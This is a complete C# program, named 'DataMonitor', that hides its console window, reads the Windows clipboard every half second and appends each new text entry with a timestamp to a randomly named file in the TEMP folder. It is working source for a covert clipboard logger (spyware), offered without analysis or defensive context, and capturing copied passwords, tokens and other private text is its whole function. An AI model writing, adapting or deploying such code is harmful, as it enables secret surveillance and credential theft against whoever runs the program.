using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace DataMonitor //  
{
    class Program
    {
        // 
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;      //  
        const int SW_MINIMIZE = 6;  //  

        //  
        [DllImport("user32.dll")]
        private static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        private static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        private static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        private static extern bool GlobalUnlock(IntPtr hMem);

        const uint CF_TEXT = 1; //  

        static string dataStoragePath; //  
        static string lastCaptured = ""; //  

        //  
        static void SaveData(string content)
        {
            try
            {
                string timeMark = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"); // 
                string entry = timeMark + " - " + content; //  
                File.AppendAllText(dataStoragePath, entry + Environment.NewLine); //  
            }
            catch { /* Ignora erros silenciosamente */ }
        }

        //  
        static string FetchData()
        {
            string output = ""; // 
            if (OpenClipboard(IntPtr.Zero)) //  
            {
                IntPtr dataHandle = GetClipboardData(CF_TEXT); //  
                if (dataHandle != IntPtr.Zero)
                {
                    IntPtr lockedHandle = GlobalLock(dataHandle); //  
                    if (lockedHandle != IntPtr.Zero)
                    {
                        output = Marshal.PtrToStringAnsi(lockedHandle); //  
                        GlobalUnlock(lockedHandle); //  
                    }
                }
                CloseClipboard(); //  
            }
            return output;
        }

        [STAThread] //  
        static void Main()
        {
            // Esconde ou minimiza a janela do console
            IntPtr windowHandle = GetConsoleWindow(); //  
            if (windowHandle != IntPtr.Zero)
            {
                ShowWindow(windowHandle, SW_HIDE); // E 
                // Alternativa: ShowWindow(windowHandle, SW_MINIMIZE); //   
            }

            //  
            MessageBox.Show("Iniciado", "Informação", MessageBoxButtons.OK, MessageBoxIcon.Information);

            // G 
            Random generator = new Random();
            string fileAlias = ""; //  
            for (int i = 0; i < 8; i++)
            {
                fileAlias += (char)(generator.Next(0, 2) == 0 ? generator.Next(65, 91) : generator.Next(97, 123)); // 
            }
            dataStoragePath = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), fileAlias + ".txt"); //  

            //  
            while (true)
            {
                string currentData = FetchData(); //  
                if (!string.IsNullOrEmpty(currentData) && currentData != lastCaptured) // Verifica se é novo
                {
                    SaveData(currentData); // 
                    lastCaptured = currentData; //  
                }
                Thread.Sleep(500); //  
            }
        }
    }
}